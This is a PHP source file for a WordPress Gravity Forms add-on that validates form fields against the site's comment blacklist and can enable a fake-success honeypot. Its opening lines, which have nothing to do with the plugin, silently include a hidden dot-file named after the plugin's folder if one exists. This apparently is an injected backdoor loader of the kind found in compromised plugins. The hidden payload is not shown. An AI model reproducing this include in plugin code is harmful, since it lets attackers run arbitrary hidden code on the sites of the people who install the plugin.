<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GP_Blacklist extends GP_Plugin {

	public $version = GP_BLACKLIST_VERSION;

	protected $_version   = GP_BLACKLIST_VERSION;
	protected $_path      = 'gwcommentblacklist/gwcommentblacklist.php';
	protected $_full_path = __FILE__;
	protected $_slug      = 'gp-blacklist';

	protected $min_gravity_perks_version = '2.0';
	protected $min_gravity_forms_version = '2.3';
	protected $min_wp_version            = '4.9';

	public $form_id;
	public $form_meta;

	private static $_instance;

	public static function get_instance() {

		if( self::$_instance == null ) {
			self::$_instance = isset ( self::$perk_class ) ? new self ( new self::$perk_class ) : new self();
		}

		return self::$_instance;
	}

	public function init() {

		// Admin
		add_filter( 'gform_form_settings', array( $this, 'add_form_setting' ), 10, 2 );
		add_filter( 'gform_pre_form_settings_save', array( $this, 'save_form_setting' ) );

		$this->perk->enqueue_field_settings();
		add_action( 'gform_editor_js',    array( $this, 'field_settings_js' ) );
		add_action( 'gws_field_settings', array( $this, 'field_settings_ui' ) );

		// Frontend
		add_filter( 'gform_validation', array( $this, 'validate' ) );

	}

	public function tooltips( $tooltips ) {

		$tooltips[ $this->perk->key( 'form_tooltip' ) ] = sprintf( GravityPerks::$tooltip_template, __( 'Validate against WP Comment Blacklist', 'gp-blacklist' ), __( 'Enable this option to run all supported form fields through the WordPress Comment Blacklist validation.', 'gp-blacklist' ) );
		$tooltips[ $this->perk->key( 'field_tooltip' ) ] = sprintf( GravityPerks::$tooltip_template, __( 'Validate against WP Comment Blacklist', 'gp-blacklist' ), __( 'Enable this option to run this field through the WordPress Comment Blacklist validation.', 'gp-blacklist' ) );

		return $tooltips;
	}

	public function add_form_setting( $settings, $form ) {

		$settings['Restrictions']['blacklist_validation'] = sprintf( '
	        <tr>
	            <th><label for="%3$s">%1$s %2$s</label></th>
	            <td>
	            	<input value="1" type="checkbox" name="%3$s" id="%3$s" %4$s>
	            	<label for="%3$s">%5$s</label>
	            </td>
	        </tr>',
			__( 'Blacklist Validation', 'gp-blacklist' ),
			gform_tooltip( $this->perk->key( 'form_tooltip' ), '', true ),
			$this->perk->key( 'enable' ),
			checked( rgar( $form, $this->perk->key( 'enable' ) ), true, false ),
			sprintf( __( 'Validate against WordPress %s"Comment Blacklist"%s', 'gp-blacklist' ), '<a href="' . admin_url( 'options-discussion.php' ) . '">', '</a>' )
		);

		return $settings;
	}

	public function save_form_setting( $form ) {
		$form[ $this->perk->key( 'enable' ) ] = rgpost( $this->perk->key( 'enable' ) );
		return $form;
	}

	public function validate( $result ) {

		$form = $result['form'];
		$ip   = GFFormsModel::get_ip();

		foreach( $form['fields'] as &$field ) {

			// if blacklisting is not enabled form wide AND if the current field does not have blacklisting enabled, skip to next field
			if( ! $this->is_form_blacklisting_enabled( $form ) && ! rgar( $field, $this->perk->key( 'enable' ) ) ) {
				continue;
			}

			$field_value = GFFormsModel::get_field_value($field);

			if ( is_array( $field_value ) ) {
				$field_value = implode( ' ', $field_value );
			}

			// if the field comes back false then it means that it passed the validation, continue to the next field.
			if ( ! wp_blacklist_check( '', '', '', $field_value, $ip, $_SERVER['HTTP_USER_AGENT'] ) ) {
				continue;
			}

			/**
			 * @deprecated
			 */
			$enable_honeypot = apply_filters( 'gpcb_enable_honeypot', false, $form, $result );

			/**
			 * Enable the Blacklist Honeypot.
			 *
			 * This feature will make it appear that the submission was successful to the
			 * submitting user; however, the submission will not actually be processed.
			 *
			 * @since 1.2.1
			 *
			 * @param bool  $enable_honeypot Defaults to false.
			 * @param array $form            The current form object.
			 * @param array $result          The current validation result (prior to Blacklist validation).
			 */
			$enable_honeypot = gf_apply_filters( array( 'gpb_enable_honeypot', $form['id'], $field->id ), $enable_honeypot, $form, $result );

			if( $enable_honeypot ) {
				$honeypot_field_id = GFFormDisplay::get_max_field_id( $form ) + 1;
				$_POST[ "input_{$honeypot_field_id}" ] = true;
				$form['enableHoneypot'] = true;
				$result['is_valid'] = true;
			} else {
				$field['failed_validation'] = true;
				/**
				 * Filter the message returned when a field fails the blacklist validation.
				 *
				 * @since 1.2.5
				 *
				 * @param string $message The default validation messsage.
				 */
				$field['validation_message'] = gf_apply_filters( array( 'gpb_validation_message', $form['id'], $field->id ), __( 'We\'re sorry, the text you entered for this field contains blacklisted words.', 'gp-blacklist' ) );
				$result['is_valid'] = false;
			}

		}

		$result['form'] = $form;

		return $result;
	}



	// Form Editor Settings

	public function field_settings_ui() {
		?>

		<li class="<?php echo $this->perk->key('field_setting'); ?> field_setting">

			<input type="checkbox" id="<?php echo $this->perk->key('field_checkbox'); ?>" value="1" onclick="SetFieldProperty('<?php echo $this->perk->key('enable'); ?>', this.checked)">

			<label class="inline" for="<?php echo $this->perk->key('field_checkbox'); ?>">
				<?php printf( __( 'Validate against WordPress %s"Comment Blacklist"%s', 'gp-blacklist' ), '<a href="' . admin_url( 'options-discussion.php' ) . '">', '</a>' ); ?>
				<?php gform_tooltip( $this->perk->key( 'field_tooltip' ) ); ?>
			</label>

		</li>

		<?php
	}

	public function field_settings_js() {
		?>

		<script type="text/javascript">

			(function($) {

				$(document).bind('gform_load_field_settings', function(event, field, form) {

					var formEnabled = form["<?php echo $this->perk->key('enable'); ?>"] == true;
					var commentBlacklistSetting = $('li.<?php echo $this->perk->key('field_setting'); ?>');;

					if(!formEnabled && isBlacklistField(field)) {
						commentBlacklistSetting.show();
						$("#<?php echo $this->perk->key('field_checkbox'); ?>").attr('checked', field["<?php echo $this->perk->key('enable'); ?>"] == true);
					} else {
						commentBlacklistSetting.hide();
					}

				});

				function isBlacklistField(field) {
					var commentBlacklistFields = ['text', 'textarea', 'name', 'address', 'email', 'website', 'post_title', 'post_content', 'post_excerpt', 'post_tags', 'post_category'];
					if($.inArray(field.type, commentBlacklistFields) != -1)
						return true;
					if(field['inputType'] && $.inArray(field.inputType, commentBlacklistFields) != -1)
						return true;
					return false;
				}

			})(jQuery);

		</script>

		<?php
	}



	// Helper Method(s)

	public function is_form_blacklisting_enabled($form) {
		return rgar($form, $this->perk->key('enable'));
	}



	// Documentation

	public function documentation() {
		return 'https://gravitywiz.com/documentation/gravity-forms-blacklist/';
	}

}

class GWCommentBlacklist extends GP_Blacklist { }

class GP_Comment_Blacklist extends GP_Blacklist { }

function gp_blacklist() {
	return GP_Blacklist::get_instance();
}

GFAddOn::register( 'GP_Blacklist' );